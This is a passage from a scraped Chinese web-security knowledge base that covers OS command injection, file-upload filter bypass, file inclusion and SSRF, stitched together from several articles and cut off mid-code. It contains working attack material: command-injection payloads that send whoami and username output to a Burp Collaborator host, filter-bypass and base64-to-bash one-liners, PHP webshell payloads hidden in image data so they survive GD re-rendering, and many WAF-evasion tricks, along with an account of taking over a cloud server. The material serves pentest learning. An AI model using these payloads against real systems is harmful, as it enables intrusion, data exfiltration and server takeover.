shell环境直接执行的，类似php的shell_exec()函数，这个函数简写也是，它的返回值就是命令执行结果，如下所示 ![image.png](./OS 注入.assets/2023_05_19_10_39_59_Pc84yoFN.png) 那么当`; && & ||` 被过滤掉时，无法构造第二条命令的时候，这时 就发挥作用了，如下payload ping -c 2 127.0.0.1`whoami` 可以看到，whoami 的执行结果已经和127.0.0.1拼接在一起了，通过shell报错也能获取命令 $() 在shell编程中，$()中存放的是命令，相当于`` 无回显注入 这里更改一下代码如下 const express = require('express') const app = new express const shell = require('child_process') const { urlencoded } = require('express') const { stderr } = require('process') const e = require('express') app.use(express.json()) app.use(express.urlencoded({ extended: false } )) app.use('/public',express.static('public/html')) app.post('/getData',(req, res) => { console.log(req.body) let productId = req.body.productId let storeId = req.body.storeId let command = `python test.py ${productId} ${storeId}` console.log(command) shell.exec(command, (err, stdout, stderr) => { if (err) { res.send('error') return } else { const data = {} if (stdout) { data.code = 200 data.message = 'success' res.send(data) } else { data.code = 404 data.message = 'error' res.send(data) } } }) }) app.listen(8088, () => { console.log('running!') }) 在无回显盲注的情况下，在判断是否存在注入点时，可以使用dnslog来判断，也可以使用ping方法（Linux机器一定要加-c参数，否则会造成拒绝服务攻击） DNSLOG windows windows 不像Linux那样可以使用``` 以及$()`外带命令执行的结果，但是可以利用windows的变量来外带数据 变量 描述 %USERNAME% 返回当前登录的用户的名称。 %USERDOMAIN% 返回包含用户帐户的域的名称 %OS% 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT %USERPROFILE% 返回当前用户的配置文件的位置 %ALLUSERSPROFILE% 返回“所有用户”配置文件的位置 %APPDATA% 返回默认情况下应用程序存储数据的位置 %CD% 返回当前目录字符串 %CMDCMDLINE% 返回用来启动当前的 Cmd.exe 的准确命令行 %CMDEXTVERSION% 返回当前的“命令处理程序扩展”的版本号 %COMPUTERNAME% 返回计算机的名称 %COMSPEC% 返回命令行解释器可执行程序的准确路径 %DATE% 返回当前日期。 %ERRORLEVEL% 返回上一条命令的错误代码。通常用非零值表示错误。 %HOMEDRIVE% 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 %HOMEPATH% 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 %HOMESHARE% 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的 %LOGONSERVER% 返回验证当前登录会话的域控制器的名称。 %NUMBER_OF_PROCESSORS% 指定安装在计算机上的处理器的数目。 %PATH% 指定可执行文件的搜索路径。 %PATHEXT% 返回操作系统认为可执行的文件扩展名的列表 %PROCESSOR_ARCHITECTURE% 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。 %PROCESSOR_IDENTFIER% 返回处理器说明。 %PROCESSOR_LEVEL% 返回计算机上安装的处理器的型号。 %PROCESSOR_REVISION% 返回处理器的版本号。 %PROMPT% 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。 %RANDOM% 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。 %SYSTEMDRIVE% 返回 Windows server operating system 根目录的位置。 %TEMP%和%TMP% 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。 %TIME% 返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。 %WINDIR% 返回操作系统目录的位置 { \"productId\":\"22\", \"storeId\":\"3&ping -n 1 %USERNAME%.6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net\" } Linux { \"productId\":\"22\", \"storeId\":\"3;ping -c 1 `whoami`.6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net\" } 文件重定向 由于是无回显的命令注入，那么需要找到web的路径，然后将命令写到web绝对路径中查看，示例代码的web解析路径在public/html目录下，那么需要将文件写入到${web}/public/html下，访问${url}/public/xxx即可 windows // 请根据实际需要修改web路径 { \"productId\":\"22\", \"storeId\":\"3&systeminfo > ./public/html/1.txt\" } Linux 命令执行小tips 一般检测方式是使用基于时间，DNSLOG检测，这两种情况都需要 基于时间 基于时间的检测方式大多使用ping命令，也有如nc，curl，telnet，但是这些命令有的服务器是不存在的，所以这里使用ping命令，来对比传输多个包与一个包的时间差异来判断是否存在命令注入 # windows 下 ping -n 12 127.0.0.1 ping -n 1 127.0.0.1 # Linux 下 ping -c 12 127.0.0.1 ping -c 1 127.0.0.1 DNSLOG dnslog 检测，主要是利用dns解析域名会发起dns请求，使用dnslog平台，发起http，dns,icmp等网络请求，只要需要dns解析域名，那么dnslog平台就可以收到域名解析记录 nslookup 6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net ping 6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net curl 6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net ... 常见绕过方式 空格绕过 ${IFS} <>(重定向符号) cat<>test cat %09(需要PHP环境) 黑名单绕过 shell拼接 a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e; base64编码 echo d2hvYW1p | base64 -d | bash 单引号，双引号 c\"\"at fl''ag.tx\"\"t 反斜杠 c\\at fl\\a\\g.tx\\t $1 ca$1t fl$1ag.t$1xt 通配符绕过 /???会去寻找 / 目录下的三个字符长度的文件，正常情况下会寻找到/bin，然后/?[a][t]会优先匹配到/bin/cat,就成功调用了cat命令，然后后面可以使用正常的通配符匹配所需读的文件，如flag.txt文件名长度为8，使用8个?’’，此命令就会读取所有长度为8的文件。 /???/?[a][t] ???????? 同理，我们也可以匹配/bin下的其他命令，如more，less，vi，tail等命令来查看文件，或者执行其他命令，甚至反弹shell 命令嵌套 echo \"result:`whoami`\" echo \"result:$(uname -a)\" >> 文件追加绕过长度限制 [aaron@localhost Desktop]$ echo c\\\\>test [aaron@localhost Desktop]$ echo at \\\\>>test [aaron@localhost Desktop]$ echo f\\\\>>test [aaron@localhost Desktop]$ echo lag.\\\\>>test [aaron@localhost Desktop]$ echo txt>>test [aaron@localhost Desktop]$ bash test 123 # 对应写在test里的命令为 c\\ at \\ f\\ lag.\\ txt 参考链接 https://portswigger.net/web-security/os-command-injection https://www.cnblogs.com/q1ya/articles/14956544.html https://www.bilibili.com/read/cv8197693/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 14:33:15 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/04.OS注入/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/05.文件操作/文件上传.html":{"url":"知识库/01.WEB安全/05.文件操作/文件上传.html","title":"文件上传","keywords":"","body":" 简介 漏洞成因 漏洞挖掘场景 上传条件 webshell 分类 bypass案例 文件类型检测绕过 文件内容检测绕过 GD库渲染绕过 JPG二次渲染 GIF二次渲染 PNG 二次渲染 写入 IDAT 数据块 总结 绕过总结 0x1 前端检测 0x2 MIME-Type验证 0x3 黑名单检测 扩展名绕过 windows 特性 Apache 特性 Linux 特性 0x4 白名单检测 0x5 文件头检测 0x6 文件体检测 0x7 其他方法（绕WAF） filename 改造 name 改造 http 头部格式改造 分块传输 免杀马 代码执行处注入内存马 参考链接 简介 文件上传漏洞是指攻击者上传了当前web服务可执行的文件，导致web站点被攻击者控制，执行系统层的命令。通常上传的文件可能是PE文件，webshell，木马文件等等 漏洞成因 文件上传漏洞是由于程序员未对上传的文件进行严格的验证和过滤,而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全,则会导致严重的后果。 漏洞挖掘场景 前端存在上传业务 命令注入重定向 日志包含 PUT上传 等等 上传条件 上传的文件能被web服务器当成动态脚本来执行 能够访问到上传的文件 如果上传的脚本不能被服务器解析，通常会配合使用文件包含，容器解析漏洞来使文件成为动态脚本 webshell 分类 单/少 功能木马 能完成写入文件、列目录、执行系统命令等少量功能的webshell 逻辑木马 利用系统逻辑漏洞或构造特殊代码，绕过访问控制或执行特殊功能的webshell（比如 php的uaf漏洞） 一句话木马 可以在目标服务器上执行嗲吗，并和客户端（如菜刀、CKnife、冰蝎、蚁剑）进行交互的webshell 多功能木马 根据目标网站语法，编写较多代码，并在服务器上执行，完成大量间谍功能的Webshell 其中一句话木马原理如下图所示： 客户端将代码通过特殊参数名（password），发送给放置在服务器上的一句话木马，一句话木马则在服务器上执行由客户端发来的代码，然后将执行结果返回给客户端，客户端接收结果之后，最后再将结果展示给用户。 bypass案例 声明该部分案例都是通过kun哥本人同意之后添加进来的（kun哥，前奇安信Ateam队员，我有微信😍） 注册登录到某系统后，在多个文件上传点进行测试，发现进行的大是白名单验证，没法上传除了多媒体文件外的其他类型。最后在修改资料位置对头像上传位置抓包，可以看到还传入了图像裁剪的参数(后续的测试把x,y都设置为0，避免对图片产生额外影响): 可以上传并返回路径，该路径可以通过拼接域名直接访问到： 修改filename类型为txt，发现可以上传成功，说明该处上传没有对文件类型进行限制，是一个潜在的getshell点： 尝试修改文件类型为php，不出意外被阿里云WAF拦截了： 在之前的测试中，已经发现头像上传位置可以进行其他类型文件上传，但是测试php文件上传时被云WAF拦截了。对云WAF的绕过主要可以依靠数据包变形、分块、去除关键字特征等。 文件类型检测绕过 测试将filename中的文件名用换行分隔即可绕过(从文件名中间找个位置，不是文件扩展名) 文件内容检测绕过 WAF还会检测内容，如存在常见的?php就会直接拦截，经过尝试，可以使用[短标签](https://www.php.net/manual/zh/language.basic-syntax.phptags.php)`、敏感函数替换加上传参分离得到payload?=@$_=$_REQUEST;call_user_func_array('assert',array($_[_]));?，这里服务端的systemerror`是因为图像渲染出错的异常: GD库渲染绕过 上面的图片在传到后台时会被php的gd库重新渲染，因为上传的文件重新下载回来md5校验对不上。将文件类型改成txt上传，查看响应包发现特征 gd-jpeg v1: 看来图片是被重新渲染了，使用了php扩展gd库中的imagecreatefromjpeg()，imagecreatefromstring(),``imagejpeg()等函数处理。这些函数在图片渲染过程中，其实存在部分原始数据没有被修改到，不同的图片类型渲染情况也不相同，主要看后端处理后是什么类型的图片特征，上面的图片从文件头JFIF和gd-jpeg看应该是用imagejpeg()生成的。这里对gd库的渲染绕过进行一些整理。 JPG二次渲染 使用脚本jpg_payload.php来处理图片需要先在头像上传的位置上传一个正常的图片，然后再把渲染后的图片下载回来用脚本处理(脚本要求，最终图像的大小必须与原始图像相同)。脚本的原理是在将webshell编码成图像数据写入到图片的Scan Header之后，文件生成后使用gd库测试是否能正常渲染然后输出payload图片。 脚本使用前需要配置好PHP运行环境，直接到PHP官网，选择合适的包下载，这里选择的是Windows下的zip压缩包： 解压完成后，到目录中看到php.ini-*的文件，选择一个重命名为php.ini,然后在其中加入extension=ext/php_gd2.dll开启gd扩展： 之后就配置下PHP的环境变量，在jpg_payload.php中加入要渲染的代码： $miniPayload可能需要多次构造，比如在最前面加字符，中间加注释，字母大写等等，经过许久的尝试，构造出以下两个可用的payload: 在JPEG文件格式中，shell代码会放在Scan Header (00 0C 03 01 00 02 11 03 11 00 3F 00)之后： 在最终构造好的payload图片中看到shell数据确实是写在Scan Header之后的： 在burp中可以很方便的修改上传的文件，在之前的数据包右键菜单中选择从文件粘贴： 上传成txt观察响应，发现php代码没有被破坏： 改成PHP后上传，访问(没有出现语法错误或者解析错误，Deprecated是说不推荐用字符串参数来调用assert断言，因为用了calluser_func_array回调，参数1就是字符串assert)： 然后测试shell执行情况，发现阿里云WAF对特征字符的拦截十分严格，执行var_dump，phpinfo马上就拦截，用PHP7特性执行(phpinfo)()回造成响应超时，应该还检测了响应数据。这里用一个没被拦截的函数die()输出数字来测试webshell执行情况： 可以看到成功执行了，说明shell还是可以用的，就是需要绕过流量特征检测。 这里想着用传递编码的字符到shell执行，但是始终会被拦截。没办法，只能从shell上下手，又经过一些免杀测试，准备好的基础免杀shell为`=$POST;@eval(base64_decode($[]));`，经过不断的尝试，终于构造出可用的图片： 最终payload(蚁剑中是保留字符，所以密码修改为了d): $miniPayload = '/sssdajkhsdajk*/ 蚁剑的编码器用的编码器是对所有参数都base64编码(之前的流量中有很明显的PHP执行代码)，返回数据也都base64： 配置编码解码： 发起的请求包如下： 最终也是使用蚁剑接管了该阿里云服务器： 云WAF的流量绕过也可以通过真实IP或者其他解析到站点的域名，因为管理员可能没有对所有的域名和IP走云WAF，就可以只绕过上传php文件的拦截，后面的流量检测是没有的。最开始拿到shell也是走一个加速域名(shell后查看了图片渲染处的源码，为后续直接对阿里云的POC构造省下了好多事)，这里估计是开发想着所有流量都过云WAF会很慢，于是把很多静态资源放在了另外一个域名上，但是这个域名并没有受到云WAF保护，没有云WAF保护，利用上面的二次渲染绕过直接getshell： GIF二次渲染 常见的方法是将GIF上传后的文件下载回来与源文件对比，找到未进行修改的部分插入PHP代码，但是操作起来很不方便。有没有类似JPG实现的自动脚本呢？在一篇博客中发现了实现方法，原脚本将生成一个纯色的GIF图，将脚本修改后可以对任意GIF文件进行代码注入： \"; // POC $_width=200; $_height=200; if(strlen($_payload)%3!=0){ echo \"payload%3==0 !\"; exit(); } $im = imagecreate($_width, $_height); // 创建新的gif图 $im = imagecreatefromstring(file_get_contents(\"SwipeTeachingCalloutImage.layoutdir-LTR.gif\")); //使用提供的Gif图 $_hex=unpack('H*',$_payload); $colors_hex=str_split($_hex[1], 6); for($i=0; $i 经过一番尝试，找到一个合适的GIF图片，并将PHP代码写入(Payload长度达到了64，还可以继续追加)： 然后将生成的example.gif文件使用GD库渲染得到新图exploit.gif： 重新渲染后，完全就是一样的GIF: 最终也是达到了可以指定GIF图、指定Payload的效果。 PNG 二次渲染 写入PLTE数据块 这种方式只针对索引彩色图像(index-color images)有效，使用poc_png工具写入。但是怎么看图片是否是索引彩色图像呢？可以使用Python库pillow来识别图像的模式，P就是索引彩色图像： 输出图像模式的代码实现： #-*- coding:utf-8 -*- from PIL import Image path = 'input.png' img = Image.open(path) print(path+\" mode:\"+img.mode) path = 'php.png' img = Image.open(path) print(path+\" mode:\"+img.mode) 转换图像模式到索引彩色图像： #-*- coding:utf-8 -*- from PIL import Image path = 'input.png' img = Image.open(path) print(path+\" mode:\"+img.mode) img = img.convert('P') img.save('new.png') print(path+\" mode:\"+img.mode) 写入 IDAT 数据块 可以通过php脚本实现，也可以使用其他语言实现的项目，Python：PNG-IDAT-Payload-Generator： $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y 1.png // //写入的webshell 其他的webshell需要通过爆破的方法得到，参考：https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ 总结 从这个实例中，研究了GIF、PNG、JPG图片二次渲染，并整理了生成工具。在漏洞点有二次渲染且存在阿里云WAF的情况下，getshell的流程方法。包括: 1.换行绕过阿里云WAF上传文件检测； 2.jpg_paylaod脚本绕过图片二次渲染； 3.webshell免杀过云WAF上传; 4.流量编码过WAF流量检测。 5.一些用到的基础PHPwebshell: //过文件内容检测 绕过总结 0x1 前端检测 function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"请选择要上传的文件!\"); return false; } //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) { var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; } } 禁用JavaScript（不适用于由js框架开发的web系统） 修改webshell 文件后缀，抓包在burp里修改 0x2 MIME-Type验证 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; } } 上传webshell，抓包在burp修改Content-Type 为以上 修改webshell文件后缀，抓包在burp里修改文件后缀 0x3 黑名单检测 扩展名绕过 Asp：asa，cer，cdx Aspx: ashx，asmx，ascx PHP：phtml，php3 JSP: jspx，jspf windows 特性 文件名后添加空格 文件名后添加点 文件名后添加点空格点(. .) 文件名大小写 文件流::$DATA 双写 双写文件后缀名 双写::$DATA 等等 Apache 特性 Apache 解析漏洞，碰到不认识的扩展名时 , 将会从后向前解析 , 直到碰到认识的扩展名位置 , 如果都不认识 , 则会暴露其源码 Apache .htaccess 解析任意文件为php Apache 扩展解析（AddType application/x-httpd-http） Linux 特性 文件名后添加/ （http put上传可行） 0x4 白名单检测 00截断（文件名可控） 图片马配合文件包含 条件竞争 0x5 文件头检测 添加文件头（常用GIF89a） 0x6 文件体检测 图片马 copy hack.jpg/b + info.php hack.jpg 二次渲染 关于绕过二次渲染,只需要找到渲染前后没有变化的位置,然后将shell代码写进去,就可以成功上传带有代码的文件了 0x7 其他方法（绕WAF） filename 改造 名字特殊符号替换以及构造异常闭合 filename='shell.jspx.jsp' filename=shell.jspx.jsp filename=shell.jspx.jsp' \"filename\"=shell.jspx; 重写 filename=shell.jpg;filename=shell.jspx; filename=shell.jspx;filename=shell.jpg; 大小写变化 FileName=shell.jspx.jsp' 参数污染 FileName=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp' FileName =shell.jspx（加空格） filename====\"shell.jspx.jsp1\"（加等号） FileName =shell.jspx（前后加空格，中间也可以加特殊符号fuzz） 文件名字编码（filename一般为后端接收参数，编码了可能识别不到，这个就看情况） filename=\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u006a\\u0073\\u0070 回车换行（有时候确实挺好用的，任意位置都可以试一下） ```http FileName=shell.jspx. jsp File Name=shell.jspx.jsp #### name 改造 name也可以任意改造，改造的方法和filename差不多，就不重复发了，主要是思路重要。 其他的比如奇奇怪怪的正则需要用到的特殊字符都可以在文件名中fuzz一下，看看能否打断waf规则，也就是把我们fuzz后缀的再跑一次，或者再找点其他的正则字母。 #### http 头部格式改造 - Content-Disposition - 溢出绕过 ```http Content-Disposition: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa form-data; name=\"file\"; filename=shell.jpg;filename=shell.jspx; 回车换行绕过(不要将固定字符打散) Content-Disposition: form-data; name=\"file\"; filename=shell.jpg;filename=shell.jspx; 双写绕过 Content-Disposition: form-data; name=\"file\"; filename=shell.jpg;filename=shell.jspx; Content-Disposition: form-data; name=\"file\"; filename=shell.jpg;filename=shell.jspx.jpg; 参数污染加减空格等等 boundary 加减空格或者前面加恶意的参数 boundary =---------------------------8472011224916008542288311250 &boundary =---------------------------8472011224916008542288311250 多个污染（他是用来分割的，他变了下面的也要变一下） boundary =---------------------------8472011224916008542288311251 boundary =---------------------------8472011224916008542288311252 回车换行污染 分割污染 Content-Type 直接删除 修改类型为application/text或者 image/jpeg等等 回车换行 溢出 参数污染 重复传入Content-Type 大小写变换 设置charsetContent-Type: multipart/form-data;charset=iso-8859-13 列举几个 ibm869 ibm870 ibm871 ibm918 iso-2022-cn iso-2022-jp iso-2022-jp-2 iso-2022-kr iso-8859-1 iso-8859-13 iso-8859-15 Accept-Encoding 改变编码类型 Accept-Encoding: gzip Accept-Encoding: compress Accept-Encoding: deflate Accept-Encoding: br Accept-Encoding: identity Accept-Encoding: * 修改请求方式，尝试put/get 修改host 头部对host进行回车，换行 修改host头部 host跟链接 host改为127.0.0.1 删除host 分块传输 在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。编码过程中长度需包括空格的长度。最后用0表示编码结束，并在0后空两行表示数据包结束，不然点击提交按钮后会看到一直处于waiting状态。免杀马 高效且实用代码执行处注入内存马 Tomcat 内存马基础参考链接 https://mp.weixin.qq.com/s/DHsv-DXvxbzYdLVevfdS0A https://yanghaoi.github.io/2021/11/24/php-ren-yi-wen-jian-shang-chuan-rao-guo-duo-chong-xian-zhi/ https://blog.csdn.net/weixin_45146120/article/details/103462910 https://xz.aliyun.com/t/10515 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 14:47:21 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/05.文件操作/文件上传.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/05.文件操作/文件包含.html":{"url":"知识库/01.WEB安全/05.文件操作/文件包含.html","title":"文件包含","keywords":"","body":" 简介 常见文件包含函数 漏洞成因 漏洞挖掘场景 案例 0x1 本地文件包含（引用内部模板文件） 0x2 远程文件包含配合SSTi RCE 简介 文件包含漏洞是代码注入的一种。其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行，代码注入的典型代表就是文件包含File inclusion。文件包含可能会出现在jsp、php、asp等语言中。服务器通过函数去包含任意文件时，由于要包含的这个文件来源过滤不严，而攻击者可以构造恶意文件在服务器上执行，获取服务器权限。 常见文件包含函数 php: include() 、include_once()、require()、require_once()、fopen()、readfile() jsp: ava.io.file()、java.io.filereader() asp: include file、include virtual 以php举例 include：包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php文件继续执行 require：跟include唯一不同的是，当产生错误时候，include会继续运行而require停止运行 include_once：这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了 require_once：这个函数跟require函数作用几乎相同，与include_once和include类似 php.ini配置文件：allow_url_fopen=off 即不可以包含远程文件。php4存在远程包含&本地包含，php5仅存在本地包含。 使用上面几个函数包含文件时，该文件将作为PHP代码执行，PHP内核并不在意被包含的文件是什么类型的。也就是说用这几个函数包含任何文件时，也会将其当做php文件来执行。 漏洞成因 程序员写程序的时候，不喜欢干同样的事情，也不喜欢把同样的代码（比如一些公用的函数）写几次（抽离公共方法，这样做叫解耦，减少代码冗余度），于是就把需要公用的代码写在一个单独的文件里面，比如 share.php，而后在其它文件需要使用时进行包含调用 示例 DVWA中文件包含漏洞 在开启allow_url_fopen=on，allow_url_include=on 的时候，即允许远程文件包含 包含本地文件： 包含远程文件： 漏洞挖掘场景 引用外部文件，如script 引用内部模板文件 引用远程模板文件 等等案例 0x1 本地文件包含（引用内部模板文件） 在此处可以看到script标签里，引用了vendor/jquery/jquery.min.js，在此处可以看到外部链接由本地文件download.php处理，通过f参数，引用vendor中的js文件 0x2 远程文件包含配合SSTi RCE Atlassian Confluence，在6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令\u0000 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 14:38:07 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/05.文件操作/文件包含.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/06.SSRF/":{"url":"知识库/01.WEB安全/06.SSRF/","title":"06.SSRF","keywords":"","body":" 定义 SSRF成因 SSRF 类型 有回显的SSRF 侧信息的SSRF（返回状态码，时间延时等） Bind SSRF（完全没有回显或其他侧信息） SSRF漏洞挖掘 常见漏洞场景 常见参数名称 JAVA中的SSRF JAVA 的网络请求类 PHP 中的SSRF PHP 的网络请求函数 SSRF 可利用的协议 JAVA file协议 Jar协议 java.net.HttpURLConnection类转换 mailto PHP DATA 协议 DICT 协议 Gopher 协议 PHAR 协议 php://filter php://input 参考链接 定义 SSRF(Server-side request forgery，服务端跨站请求伪造)是一种 Web 安全漏洞，允许攻击者诱导服务器端应用程序向攻击者选择的任意域发出 HTTP 请求。攻击可强制让服务器链接到任意内部或者外部的其他主机，从而可能泄露服务器敏感信息或者对其他主机发起恶意请求。常见的利用方式可以探测内部网络部署的服务信息、端口开放情况，攻击一些内部的服务等。 SSRF成因 SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。 SSRF 类型 根据SSRF 请求后的返回情况来看，SSRF可以分为以下三种情况，一般来说，完全回显的SSRF可以直观的看到SSRF产生的效果，比如可以很快得知内部的一些系统框架版本等信息；部分回显可能只有一些响应状态码等信息来判断内部网络情况；Bind SSRF 这种只能尝试一些如数据外带的方式的利用方式了。 这里使用WebGoat靶场来针对性的讲解如下示例 有回显的SSRF 有回显的SSRF在漏洞触发之后，可以将服务器请求后的详细信息返回。以Webgoat靶场中的SSRF模块来分析，SSRFTask2使用了java.net.URL类对外部发起请求，其关键代码如下 import java.net.URL; try (InputStream in = new URL(url).openStream()) { // Otherwise the \\n gets escaped in the response html = new String(in.readAllBytes(), StandardCharsets.UTF_8).replaceAll(\"\\n\",\"\"); } catch (MalformedURLException e) { return getFailedResult(e.getMessage()); } catch (IOException e) { //in case the external site is down, the test and lesson should still be ok html = \"Although the http://ifconfig.pro site is down, you still managed to solve\" + \" this exercise the right way!\"; } 分析代码，对输入的URL进行了matches匹配，只允许访问http://ifconfig.pro，为了查看回显SSRF效果，将代码中的字符串匹配逻辑修改如下 if (!url.matches(\" \")) { String html; try (InputStream in = new URL(url).openStream()) { ... } catch { .... } } 在这里测试，在url中输入http://www.baidu.com，就会把请求内容返回回来，这种就叫做有回显的ssrf提交的URL参数在服务器上使用java.net.URL类去发起请求，然后打开URL保存二进制流`InputStream in = new URL(url).openStream()`，最后将结果处理后返回给前端。 侧信息的SSRF（返回状态码，时间延时等） 这种类型因为在后端进行了相应处理，无法获得完整的响应源码，只能通过后端返回状态码，请求响应延时等来判断SSRF情况。像上面的demo可以修改一下模拟这个场景，成功请求返回1,失败返回0 当请求一个不存在的域名导致失败，输出位置返回0： 这就是根据回显信息的不同表现来判断是否成功发起了请求，在SSRF中可以对自身web服务进行请求再和不存在的地址请求，可以观察到不同的响应参数值、响应延时等说明极有可能存在SSRF。 Bind SSRF（完全没有回显或其他侧信息） 这一类的SSRF就完全没有回显和侧信息来泄露利用结果，服务器的返回始终一致，一般的可以通过OOB数据带外来观察是否存在漏洞，如下使用端口监听方法，vps上开启端口监听，在可能存在漏洞的位置写入vps的监听地址 使用dnslog平台判断 SSRF漏洞挖掘 常见漏洞场景 带有URL的参数传递 参数中的图片地址 端口开放情况检测 数据库链接检测 代码仓库的clone 远程文件内容获取 远程图片获取 后台状态刷新 web hook消息同步 远程图片或文件的加载与下载 离线下载 网页翻译 在线转码（ffpmg，ImageMagick，docx，pdf，xml） 收藏功能 云服务厂商 网络探测工具（网络设备） 网站采集 数据库内置（MongoDB） 邮箱（Exchange）在线打印服务 订阅服务 等请求字段中存在IP的地方 关注一些可能使用远程地址的功能、带有URL等关键字的参数、带远程地址的参数值等 常见参数名称 share wap url link src source target u 3g display sourceURI imageURL domain 等等...JAVA中的SSRF 产生SSRF的原因都是在代码层面没有对传入的地址进行严格限制。在JAVA代码审计中，不仅要关注可能对外发起请求的类调用，也要关注一些限制措施是否存在绕过的可能，在手工审计过程中通过功能点审计一些常见的外部请求类和第三方包的使用代码，进而分析是否存在漏洞，总结一些可能存在SSRF漏洞的代码，审计时可以查找类的调用代码，观察输入是否可控、代码过滤是否可以绕过。 在webgoat中，SSRF的两个task都是做过限制，比如如下，如果url不能完全匹配http://ifconfig.pro，则无法进入代码层 JAVA 的网络请求类 java.net.URL webgoat靶场SSRF中的代码，使用URL类中openStream()打开远程链接的数据流：import java.net.URL; try { InputStream in = new URL(url).openStream() } java.net.URLConnection URL类的openConnection方法：import java.net.URLConnection; URLConnection urlConnection = new URL(url).openConnection(); java.net.HttpURLConnectionimport java.net.HttpURLConnection; URL requrl = new URL(url); HttpURLConnection con = (HttpURLConnection) requrl.openConnection(); java.net.http.* 在JDK11后开始自带，由JDK9的jdk.incubator.http迁移而来：import java.net.http.HttpClient; import java.net.http.HttpRequest; import java.net.http.HttpResponse; HttpClient client = HttpClient.newHttpClient(); HttpRequest request = HttpRequest.newBuilder() .uri( java.net.URI.create(\"http://foo.com/\")) .build(); client.sendAsync(request, HttpResponse.BodyHandlers.ofString()) .thenApply(HttpResponse::body) .thenAccept(System.out::println) .join(); Apache HttpComponentstry (CloseableHttpClient httpclient = HttpClients.createDefault()) { ... } httpclient.execute() HttpPost httpPost = new HttpPost ... okhttp OkHttp是一个 Java 的 HTTP+SPDY 客户端开发包，同时也支持 Android，由Square 公司开源贡献，项目官博：https://square.github.io/okhttp/。示例代码：package okhttp3.guide; import java.io.IOException; import 